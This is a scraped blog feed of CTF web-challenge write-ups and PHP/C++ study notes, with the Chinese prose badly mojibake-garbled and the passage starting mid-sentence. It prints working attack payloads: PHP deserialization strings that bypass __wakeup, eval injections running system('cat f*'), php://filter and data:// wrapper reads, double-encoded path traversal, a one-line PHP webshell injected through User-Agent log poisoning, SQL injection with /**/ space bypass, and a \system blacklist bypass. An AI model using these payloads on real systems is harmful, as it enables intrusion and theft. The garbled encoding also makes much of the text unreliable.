ä¸ºæˆ‘ä»¬çŸ¥é“ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨__wakeup()è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå®ƒæŠŠusernameèµ‹å€¼ä¸ºguestï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆæ€ä¹ˆç»•è¿‡è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåœ¨ç½‘ä¸ŠæŸ¥ç»•è¿‡æ–¹å¼æ˜¯è®©ç±»çš„å±æ€§å¤§äºåŸæ¥çš„æ—¶å€™ï¼Œå¯ä»¥ç»•è¿‡è¯¥å‡½æ•°ã€‚æ¬§å…‹ï¼Œï¼Ÿselect=O:4:â€Nameâ€:<mark>3</mark>:{s:14:â€%00Name%00usernameâ€;s:5:â€adminâ€;s:14:â€%00Name%00passwordâ€;i:100;},å¾—åˆ°flagã€‚</p><h1>é¢˜ç›®ä¸‰</h1><p><img src="4.png"></p><p>æ•´é“é¢˜çš„è§£é¢˜ç‚¹å°±æ˜¯è®©passwordå…¨ç­‰äºpè®©usernameç­‰äºuï¼Œç„¶è€Œæˆ‘æ„Ÿè§‰è¿™ä¸ª$n åº”è¯¥å°±æ˜¯xxxxxxï¼Œ$P ç­‰äºxxxxxxï¼Œ<br>å…¶å®è¿™é“é¢˜åº”è¯¥å°±æ˜¯å¯¹ç±»çš„å·©å›ºï¼Œä¸ååºåˆ—åŒ–åº”è¯¥æ²¡å•¥å…³ç³».</p><h1>é¢˜ç›®å››</h1>è¿™é“é¢˜ä¹ä¸€çœ‹è·Ÿä¸Šä¸€é“ä¸€æ ·å®åˆ™ä¸ç„¶<p><img src="5.png"></p><p><img src="6.png"></p><h1>é¢˜ç›®äº”</h1><p>è¿™é“é¢˜è·Ÿä¸Šä¸€é“é¢˜ç›®ä¸åŒçš„åœ°æ–¹åœ¨äºã€‚</p><p><img src="7.png"></p><p>è¿™æ®µä»£ç çš„æ„æ€æ˜¯è¦è®©æˆ‘ä»¬çš„usernameä¸passwordçš„å€¼ä¸åŒï¼Œä½†æ˜¯è¿™ä¸ªç±»ç»™ä¸¤è€…çš„èµ‹å€¼éƒ½æ˜¯xxxxxxï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆä½¿è¿™ä¸¤è€…çš„å€¼ä¸ç›¸åŒå‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼Œä¸Šä¸€é“é¢˜ç›®ï¼Œæˆ‘ä»¬çš„isvipæ˜¯falseä½†æ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½¿å…¶ååºåˆ—åŒ–ï¼Œå¾—åˆ°çš„å€¼æ˜¯trueï¼Œé‚£æˆ‘ä»¬å°è¯•æ„é€ ä½¿å¾—usename=abï¼›password=abcï¼›isvip=trueï¼Œå¾—åˆ°flag</p><p><img src="8.png"></p><H1>é¢˜ç›®å…­</h1><p><img src="9.png"></p><p>æ‹¿åˆ°é¢˜åï¼Œå…ˆæ•´ç†ä¸‹æ€è·¯ï¼Œå°±æ˜¯ç”¨getä¼ å…¥usernameå’Œpasswordå…·ä½“çš„å€¼æ˜¯ä»€ä¹ˆæ ·å­çš„å¯¹é¢˜ç›®æ²¡æœ‰å½±å“ï¼Œç„¶åè¿›å…¥ä¸‹ä¸€æ­¥ï¼Œååºåˆ—åŒ–userï¼Œç„¶ååˆ°è¾¾ææ„å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°ææ„å‡½æ•°è¿™é‡Œæœ‰ä¸€ä¸ªgetinfoï¼ˆï¼‰ã€‚ä¸‹é¢æœ‰ä¸¤ä¸ªç±»ï¼Œéƒ½æœ‰getinfoï¼ˆï¼‰ï¼Œä½†æ˜¯ç¬¬äºŒä¸ªç±»ä¸­å«æœ‰evalè¿™ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°æ˜¯å¯ä»¥æ‰§è¡Œphpå‘½ä»¤çš„ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ„é€ $code=<mark>â€˜</mark>system(â€˜lsâ€™);<mark>â€˜</mark>;æ‰€ä»¥æˆ‘ä»¬å°±è¯¥æƒ³æ€ä¹ˆæ‰èƒ½æ¥åˆ°backdoorç±»è¿™é‡Œã€‚<br><br>å› ä¸ºæˆ‘ä»¬çœ‹åˆ°ææ„å‡½æ•°é‚£é‡Œæ˜¯$this-&gt;class,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•è®©$class=new backdoor();</p><p><img src="10.png"></p><p>ç„¶åcatï¼Œå¾—åˆ°flagã€‚<br><br>åˆåœ¨ç½‘ä¸Šçœ‹åˆ°æœ‰å¤§ä½¬æ˜¯è¿™æ ·æ„é€ çš„<mark>$code=â€™system(â€œcat f*â€);â€™</mark></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuå­¦ä¹ ç¬¬äºŒå¤©ï¼ˆä¸¤é¢˜ï¼‰</title>
      <link href="/2021/01/16/buu%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
      <url>/2021/01/16/buu%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>buuçš„ç¬¬äºŒå¤©çš„å­¦ä¹ ã€‚</p><span id="more"></span><p>å› ä¸ºä¸Šå­¦æœŸå­¦ä¹ äº†æ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥è¿™æ¬¡å°±é€‰äº†ä¸€é“æ–‡ä»¶åŒ…å«çš„é¢˜ç›®ï¼Œæœ‰ç‚¹ç®€å•ã€‚<br></p><h2>ACTFæ–°ç”Ÿèµ›æ–‡ä»¶åŒ…å«</h2>ã€‚<br>ç‚¹å¼€åæ˜¯tipsï¼Œç‚¹å‡»è¿›å…¥ä¸‹ä¸€ä¸ªç•Œé¢ï¼Œç„¶åæœ‰ä¸ªæç¤ºã€‚<br><mark>Can you find out the flag?</mark>ç„¶åæˆ‘æœ‰è§‚å¯Ÿåˆ°å®ƒçš„urlæ˜¯<mark>?file=flag.php</mark><BR>äºæ˜¯å°±ç›´æ¥ä¼ªåè®®è¯»å–?file=php://filter/read=convert.base64-encode/resource=flag.phpå¾—åˆ°flagã€‚<h2>GXYCTFç¦æ­¢å¥—å¨ƒ</h2><p>æ‰“å¼€é¢˜ç›®æ²¡æœ‰æ€è·¯ï¼Œæ‰«æå‘ç°æ˜¯.gitæ³„éœ²ï¼Œç„¶åå°±æ˜¯</p><pre><code>&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;]))&#123;if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;    if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;        if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;            // echo $_GET[&#39;exp&#39;];            @eval($_GET[&#39;exp&#39;]);        &#125;        else&#123;            die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;);        &#125;    &#125;    else&#123;        die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;);    &#125;&#125;else&#123;    die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;);&#125;&#125;// highlight_file(__FILE__);?&gt;</code></pre><p>è¿‡æ»¤æ¥é‚£ä¹ˆå¤šï¼Œå°±è¯•è¯•ï¼Œæ— å‚æ•°rceæŠŠï¼Œä¹‹å‰æœ‰ä¸€ä¸ªåšæ–‡å†™è¿‡</p><p>highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p><p>show_source(session_id(session_start()));<br>å¾—åˆ°flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buu warm up</title>
      <link href="/2021/01/15/up/"/>
      <url>/2021/01/15/up/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>å¼€å¯buuåˆ·é¢˜ä¹‹è·¯</p><span id="more"></span><p>æ‹¿åˆ°é¢˜ç›®åªæœ‰ä¸€ä¸ªç¬‘è„¸ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°é‡Œé¢æœ‰ä¸ªsource.php,æ‰“å¼€åæ˜¯ä¸€ä¸ªphpä»£ç .<br><br>     <mark>$whitelist =[â€œsourceâ€=&gt;â€source.phpâ€,â€hintâ€=&gt;â€hint.phpâ€];</mark><br><br>çœ‹åˆ°è¿™å¥ä»£ç ï¼Œæˆ‘æŸ¥çœ‹äº†hint.php,è¯¥é¡µé¢æç¤ºäº†flagå­˜æ”¾çš„ä½ç½®<br><br>     <mark>flag not here, and flag in ffffllllaaaagggg</mark><br><br>çŸ¥é“äº†flagå­˜æ”¾çš„ä½ç½®ï¼Œå°±è¦å¼€å§‹çŸ¥é“è¿™æ®µä»£ç åˆ°åº•æ˜¯ä»€ä¹ˆæ„æ€ï¼Œæˆ‘ä»¬æ€ä¹ˆæ ·æ‰å¯ä»¥å¾—åˆ°flagã€‚<br></p><p><img src="1.png"></p><p>ä»è¿™æ®µä»£ç æˆ‘ä»¬çŸ¥é“äº†ä¸‹ä¸€æ­¥è¯¥åšä»€ä¹ˆ<br></p><p><img src="2.png"><br>è¿™é‡Œé¢æœ‰4ä¸ªifæ¡ä»¶å¥ï¼Œåªè¦æœ‰ä¸€ä¸ªå¯ä»¥è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°flag<br><br>ä½†æ˜¾ç„¶ç¬¬ä¸€ä¸ªifå¯¹æˆ‘ä»¬æ²¡æœ‰ç”¨<br><br>ç¬¬äºŒä¸ªifï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿å…¶æˆç«‹ï¼Œæˆ‘ä»¬å°±è¦æ„é€ æœ‰å«æœ‰source.phpæˆ–è€…hint.phpï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬å¿…éœ€æ„é€ çš„å‚æ•°ä¸­å«æœ‰ffffllllaaaaggggï¼Œå¦åˆ™æˆ‘ä»¬æ˜¯æ‹¿ä¸åˆ°flagï¼Œæ‰€ä»¥è¿™ä¸ªä¹Ÿæ˜¯ä¸å¯è¡Œçš„ã€‚<br><br>ç¬¬ä¸‰ä¸ªifï¼Œå› ä¸ºè¿™ä¸ªæ˜¯ä¿ç•™ï¼Ÿä»¥å‰çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ file=source.phpï¼ˆæˆ–è€…hint.phpï¼‰%3fï¼ˆè¿™ä¸ªæ˜¯ï¼Ÿè¿›è¡Œäº†urlç¼–ç ï¼Œå¦‚æœç›´æ¥æ˜¯ï¼Ÿï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¼šä»¥ä¸ºæ˜¯æäº¤çš„å‚æ•°ï¼‰./ffffllllaaaaggggå‚çœ‹å½“å‰ç›®å½•æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰çš„ï¼Œç„¶å../æŸ¥çœ‹çˆ¶çº§ç›®å½•ï¼Œ?file=source.php%3f../../../../../ffffllllaaaaggggå¾—åˆ°flagã€‚<br><br>ç¬¬å››ä¸ªifï¼Œè¿™ä¸ªæ˜¯å…ˆè§£ç ï¼Œç„¶ååœ¨ä¿ç•™ï¼Ÿä»¥å‰çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹ï¼Ÿè¿›è¡Œä¸¤æ¬¡urlç¼–ç ï¼Œä¸€ä¸ªæ˜¯å…ˆè®©æœåŠ¡å™¨è§£ç ï¼Œä¸€ä¸ªæ˜¯åœ¨ç±»é‡Œé¢è¿›è¡Œï¼Œæ„é€ ?file=source.php%253f../../../../../ffffllllaaaaggggå¾—åˆ°flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥å­¦ä¹ </title>
      <link href="/2020/12/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/12/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>å¿˜ä¿å­˜äº†ï¼Œå†™äº†ä¸€åŠå…¨æ²¡äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚é‚£å°±éšä¾¿å†™å†™ï¼Œæœ¬æ¥å†™è¿™ä¸ªå°±æ˜¯ä¸ºäº†å¯ä»¥æ›´å¥½çš„ç†è§£sqlæ³¨å…¥ï¼Œç°åœ¨ä¸€åŠéƒ½æ²¡äº†ï¼Œä¹Ÿå°±éšä¾¿å§ï¼Œæ— æ‰€è°“äº†</p><span id="more"></span><h1>åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</h1><li>å•å¼•å·åˆ¤æ–­æ³•ã€‚å¦‚æœé¡µé¢è¿”å›é”™è¯¯åˆ™å­˜åœ¨sqlæ³¨å…¥ã€‚å› ä¸ºæ— è®ºæ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•´å‹éƒ½ä¼šå› ä¸ºå•å¼•å·ä¸ªæ•°ä¸åŒ¹é…è€ŒæŠ¥é”™]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web4,web5,web6ï¼Œè€—å­å°¾æ±</title>
      <link href="/2020/12/27/web4-web5-web6/"/>
      <url>/2020/12/27/web4-web5-web6/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>web4-6ï¼Œè€—å­å°¾æ±</p><span id="more"></span><h1>web4</h1>æ ¹æ®æç¤ºï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜¯æ—¥å¿—æ³¨å…¥ï¼Œæ–‡ä»¶åŒ…å«<br>é€šè¿‡bpæŠ“åŒ…åœ¨å“åº”å¤´é™¤ï¼Œå¯ä»¥å‘ç°å…¶ç”¨çš„æ˜¯nginxï¼Œæ‰€ä»¥æ‰¾åˆ°å…¶å­˜æ”¾æ—¥å¿—çš„åœ°æ–¹æ˜¯/var/log/nginx/access.logæ„é€ urlï¼Œçœ‹åˆ°åˆå›å“ï¼ŒbpæŠ“åŒ…ï¼Œåœ¨user-agentå‡ºæ·»åŠ ä¸€å¥è¯æœ¨é©¬<ï¼Ÿphp @eval(POST_["lucky"]);ï¼Ÿ>ï¼Œé“¾æ¥ï¼Œå¾—åˆ°flagã€‚<h1>web5</h1>ä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯è®©v1å’Œv2çš„MD5å€¼ç›¸åŒï¼Œç„¶åv1ï¼ˆctype_alphaï¼‰å¿…éœ€å…¨ä¸ºå­—æ¯ï¼Œv2ï¼ˆis_numericï¼‰å¿…éœ€å…¨ä¸ºæ•°å­—<br>v1=QNKCDZO&v2=240610708å¾—åˆ°flag<h1>web6</h1>å’Œå‰å‡ å¤©åšçš„sqlæ³¨å…¥é¢˜ç›®å¤§æ¦‚ç±»ä¼¼ï¼Œå°±æ˜¯éšä¾¿è¾“å…¥ä¸€ä¸ªå¯†ç ï¼Œç„¶åbpæŠ“åŒ…ï¼Œæç¤ºsqlæ³¨å…¥å¤±è´¥ï¼Œå¾—çŸ¥è¿™æ˜¯ä¸€é“sqlæ³¨å…¥é¢˜ç›®ï¼Œç„¶åç”¨admin' or 1=1#(#æ„æ€æ˜¯æ³¨é‡Šæ‰åé¢çš„ä¸œè¥¿ï¼Œæ‰€ä»¥å¯†ç å¯ä»¥éšä¾¿è¾“),æ­¤æ—¶æ— ä»»ä½•å›å“ï¼Œå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œé€šè¿‡ç™¾åº¦ï¼Œç©ºæ ¼è¿‡æ»¤å¯ä»¥ç”¨/**/ç»•è¿‡ï¼Œæ˜¾ç¤ºç™»å½•æˆåŠŸï¼Œç„¶åå°±æ˜¯è·Ÿä¸Šæ¬¡çš„sqlæ³¨å…¥ç›¸åŒï¼Œè¯¦è§ç¬¬äºŒæ¬¡å­¦ä¹ æŠ¥å‘Šã€‚<h1>è€—å­å°¾æ±</h1>è¿˜æ˜¯ä¸€æ®µphpä»£ç ï¼Œå¯ä»¥çœ‹å‡ºçš„æ˜¯error_reporting(0);<BR>highlight_file(__FILE__);<BR>$a = $_GET['a'];<BR>$b = $_GET['b'];<BR>function CTFSHOW_36_D($a,$b){<BR>    $dis = array<BR>("var_dump","exec","readfile","highlight_file","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents","");<BR>    $a = strtolower($a);<BR>    if (!in_array($a,$dis,true)) {<BR>        forward_static_call_array($a,$b);<BR>    }else{<BR>        echo 'hacker';<BR>    }<BR>}<BR>CTFSHOW_36_D($a,$b);<BR>echo "rlezphp!!!"; <BR>ç®€å•çš„è¯´å°±æ˜¯ï¼Œå¦‚æœæ•°ç»„aå‡ºç°åœ¨disä¸­å°±è¾“å‡ºechoï¼Œè¿™æ˜¯ä¸€ä½å¤§ä½¬å†™çš„åšå®¢ï¼ˆåœ¨phpå½“ä¸­é»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name()è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ï¼‰ï¼Œå¦‚æœaæ²¡æœ‰å‡ºç°åœ¨disä¸­å°±è°ƒç”¨aï¼Œbã€‚ä»å®˜æ–¹è¯´æ˜å½“ä¸­å¯ä»¥çŸ¥é“forward_static_call_array â€” Call a static method and pass the arguments as arrayï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è°ƒç”¨é™æ€æ–¹æ³•å¹¶ä¸”å°†æ•°ç»„ä½œä¸ºå‚æ•°ä»å®˜æ–¹è¯´æ˜å½“ä¸­å¯ä»¥çŸ¥é“forward_static_call_array â€” Call a static method and pass the arguments as arrayï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è°ƒç”¨é™æ€æ–¹æ³•å¹¶ä¸”å°†æ•°ç»„ä½œä¸ºå‚æ•°<br>å‚è€ƒå‰ç½®çŸ¥è¯†å› æ­¤æˆ‘ä»¬ä¸éš¾æƒ³åˆ°payload:a=\system&b[]=lsä¹‹åa=\system&b[]=cat flag.php]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpå­¦ä¹ ä¹‹è·¯åŸºç¡€ç¯‡</title>
      <link href="/2020/12/23/php%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
      <url>/2020/12/23/php%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>ä»phpå¼€å§‹å­¦èµ·</p><span id="more"></span><h1>phpçš„æ ‡è®°é£æ ¼</h1><ul><li><i>xmlé£æ ¼</i><br><?php echo;?><LI><i>è„šæœ¬é£æ ¼</i><br><script language="php">echo;</script><li><i>ç®€çŸ­é£æ ¼</i><?echo;?><li>aspé£æ ¼</li><%echo;%><p><img src="1.png"><br>hahaï¼Œä¸æƒ³éº»çƒ¦è¿™åœ¨è½¬æ¥è½¬å»çš„ã€‚<br></p><h1>phpæ³¨é‡Šçš„åº”ç”¨</h1><li><i>c++é£æ ¼çš„å•è¡Œæ³¨é‡Šï¼ˆ//ï¼‰</i>åœ¨å•è¡Œæ³¨é‡Šä¸­ï¼Œä¸è¦å‡ºç°ï¼Ÿ>ï¼Œå› ä¸ºè§£é‡Šå™¨ä¼šè®¤ä¸ºphpè„šæœ¬ç»“æŸï¼Œè€Œå»æ‰§è¡Œï¼Ÿ>åé¢çš„ä»£ç ã€‚<?php echo; //?><LI><I>cé£æ ¼çš„å¤šè¡Œæ³¨é‡Š</I><?**echo;?><li><i>shellé£æ ¼çš„æ³¨é‡Šï¼ˆ#ï¼‰</i><?echo;        #?><p><img src="2.png"></p><h1>phpçš„æ•°æ®ç±»å‹</h1>æ ‡é‡æ•°æ®ç±»å‹ï¼šbooleanï¼Œinteger,float,string.<br>å¤åˆå‹ï¼šarray,object<br>ç‰¹æ®Šç±»å‹ï¼šnull,resource<br>boolean:true,false<br>//åœ¨phpä¸­ä¸æ˜¯åªæœ‰booleanæ˜¯falseï¼Œå…¶ä»–æ¯”å¦‚0ï¼Œ0.0ï¼Œ""éƒ½å¯ä»¥æ˜¯false<br>//$æ˜¯å˜é‡çš„æ ‡è¯†ç¬¦ï¼Œæ— è®ºæ˜¯å£°æ˜å˜é‡è¿˜æ˜¯è°ƒç”¨å˜é‡éƒ½åº”è¯¥æ˜¯$ç¬¦å·ã€‚<br>string:å¯ä»¥ç”¨'',"",<<<<br>ä½†æ˜¯åŒå¼•å·æ‰€åŒ…å«çš„å˜é‡ä¼šè‡ªåŠ¨æ›¿æ¢æˆå®é™…æ•°å€¼ã€‚<br>/è¿™é‡Œè¡¥å……è½¬ä¹‰å­—ç¬¦ã€‚<br>/æ„Ÿè§‰ç•Œå®šç¬¦ç”¨çš„å¥½å°‘å•Šã€‚<br>$str=<<<std<br>è¦è¾“å‡ºçš„å­—ç¬¦ä¸²ã€‚<br>std<br>integer:16è¿›åˆ¶æ˜¯0x,å…«è¿›åˆ¶æ˜¯0.float:æµ®ç‚¹å‹ä¹‹é—´ä¸èƒ½æ¯”è¾ƒå¤§å°ï¼ï¼ï¼<br>æ•°ç»„ï¼šä¸‰ç§è¯­æ³•æ ¼å¼ã€‚<br>$array=('value1','value2'...)<br>$array[key]='value'<br>$array=(key1=>value1,key2=>value2...)<br>å…¶ä¸­keyæ˜¯æ•°ç»„çš„ä¸‹æ ‡<br>resourse:null;ç©ºå€¼ï¼Œæ²¡æœ‰è¢«èµ‹äºˆä»»ä½•å€¼ï¼Œè¢«èµ‹äºˆnullï¼Œè¢«unsetï¼ˆï¼‰<h1>è½¬æ¢æ•°æ®ç±»å‹<h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c++å®éªŒ</title>
      <link href="/2020/12/20/postc-%E5%AE%9E%E9%AA%8C/"/>
      <url>/2020/12/20/postc-%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>æŠŠè®¡ç®—æœºå¯¼è®ºå®éªŒå¸ƒç½®çš„å®éªŒæ€»ç»“ä¸€ä¸‹</p><span id="more"></span><p><i>å®éªŒ5.1</i></p>è¾“å‡º <br>       ******************* <br><pre><code>I  love  computer ï¼&lt;br&gt;*******************&lt;br&gt;</code></pre><p>æ¯”è¾ƒç®€å•çš„<br></p><p><img src="1.png"></p><p><i>å®éªŒ5.2</i></p>ç¼–å†™ç¨‹åºï¼Œä»é”®ç›˜è¾“å…¥ä¸¤ä¸ªå®æ•°aï¼Œbï¼Œè®¡ç®—è¡¨è¾¾å¼3a(b+4)/2çš„å€¼ï¼Œå¹¶è¾“å‡ºç»“æœã€‚<p><img src="2.png"></p><p>è®¾åœ†çš„åŠå¾„r=1.5ï¼Œåœ†æŸ±é«˜h=3ï¼Œç¼–ç¨‹æ±‚åœ†çš„å‘¨é•¿ï¼Œåœ†é¢ç§¯ï¼Œåœ†çƒè¡¨é¢ç§¯ï¼Œåœ†çƒä½“ç§¯ï¼Œåœ†æŸ±ä½“ç§¯ï¼Œå¹¶è¾“å‡ºè®¡ç®—æœºç»“æœã€‚<br><img src="3.png"></p><p><i>å®éªŒ5.3</i></p>æœ‰ä¸€ä¸ªå‡½æ•°ï¼š<br><pre><code>x (x&lt;1)&lt;br&gt;</code></pre><p>y=  2x-1 (1â‰¤xï¼œ10)<br><br>    3x (xâ‰¥10)<br><br>è®¡ç®—<br><img src="4.png"><br>ç¼–å†™ç¨‹åºï¼Œè¾“å…¥ä¸€ä¸ªæ•´æ•°nï¼Œåˆ¤æ–­æ•´æ•°nèƒ½å¦åŒæ—¶è¢«3å’Œ5æ•´é™¤ï¼Œè¾“å‡ºç»“æœ<BR><br><img src="5.png"></p><p><i>å®éªŒ5.4</i></p><p>1ï¼‰ç¼–å†™ç¨‹åºï¼Œè¾“å‡º50~100ä¹‹é—´çš„æ‰€æœ‰èƒ½è¢«9æ•´é™¤çš„æ•°ã€‚<br><br><img src="6.png"></p><p>ï¼ˆ2ï¼‰ç¼–å†™ç¨‹åºï¼Œè¾“å‡º50~100ä¹‹é—´çš„å…¨éƒ¨ç´ æ•°ã€‚<br><img src="7.png"><br>ï¼ˆ3ï¼‰ç¼–å†™ç¨‹åºï¼Œåœ¨å±å¹•ä¸Šæ˜¾ç¤ºå¦‚ä¸‹ä¿¡æ¯<br><img src="8.png"></p><p><i>å®éªŒ5.5</i></p>æ˜¾ç¤º![](9.png)<p><img src="10.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æ”¶é›†</title>
      <link href="/2020/12/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2020/12/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>ç›®å½•éå†</h1>è·¯å¾„éå†æ”»å‡»(ç›®å½•éå†)æ—¨åœ¨è®¿é—®å­˜å‚¨åœ¨webæ ¹ç›®å½•æ–‡ä»¶å¤¹ä¹‹å¤–çš„æ–‡ä»¶å’Œç›®å½•ã€‚é€šè¿‡æ“æ§å¸¦æœ‰â€œç‚¹-æ–œçº¿ï¼ˆ...ï¼‰â€åºåˆ—ä»¥åŠå˜åŒ–çš„æ–‡ä»¶æˆ–ä½¿ç”¨ç»å¯¹æ–‡ä»¶è·¯å¾„æ¥å¼•ç”¨æ–‡ä»¶å˜é‡ï¼Œå¯ä»¥è®¿é—®å­˜å‚¨åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶å’Œç›®å½•ï¼ŒåŒ…æ‹¬åº”ç”¨ç¨‹åºæºä»£ç ï¼Œé…ç½®æ–‡ä»¶å’Œå…³é”®ç³»ç»Ÿæ–‡ä»¶ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç³»ç»Ÿè®¿é—®æ§åˆ¶(å¦‚åœ¨å¾®è½¯windowsæ“ä½œç³»ç»Ÿä¸Šé”å®šæˆ–ä½¿ç”¨æ–‡ä»¶)é™åˆ¶äº†å¯¹æ–‡ä»¶çš„è®¿é—®æƒé™ã€‚è¿™ç§æ”»å‡»ä¹Ÿç§°ä¸ºâ€œç‚¹ç‚¹æ–œæ â€ï¼Œâ€œç›®å½•éå†â€ï¼Œâ€˜ç›®å½•çˆ¬å‡â€™å’Œâ€˜å›æº¯â€™ã€‚]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸¤é“ä¼ªåè®®</title>
      <link href="/2020/12/04/%E7%AC%AC%E4%BA%8C%E5%91%A8wp/"/>
      <url>/2020/12/04/%E7%AC%AC%E4%BA%8C%E5%91%A8wp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1><font color="DarkSeaGreen"><i>ä¼ªåè®®ä¸€</i></font></h1><p><img src="1.png" alt="1"></p><p>emmmm,æ‹¿é“é¢˜ç›®æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œçœ‹åˆ°æŠŠä¼ªåè®®éƒ½è¿‡æ»¤äº†ï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹è¿™ä¸ªæ­£åˆ™åŒ¹é…åªæ˜¯æŠŠå°å†™çš„å‡ ä¸ªä¼ªåè®®è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨å¤§å†™ç»•è¿‡<br><br>æƒ³äº†æœ‰å‡ ç§æ„é€ æ–¹æ³•<br></p><ul><li>?file=PHP://filter/resource=flag<li>?file=PHP://filter/read=convert.BASE.64-encode/resource=flag<li>?file=DATA://text/plain;BASE.64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZyIpOw==<li>?file=PHP://input<br>[POST DATA]&#60;?php system("cat flag");?&#62;</ul>ä½†æ˜¯æœ€ååªæœ‰ç¬¬äºŒä¸ªæ˜¯æˆåŠŸçš„å¾—åˆ°äº†base64ç¼–ç <h1><font 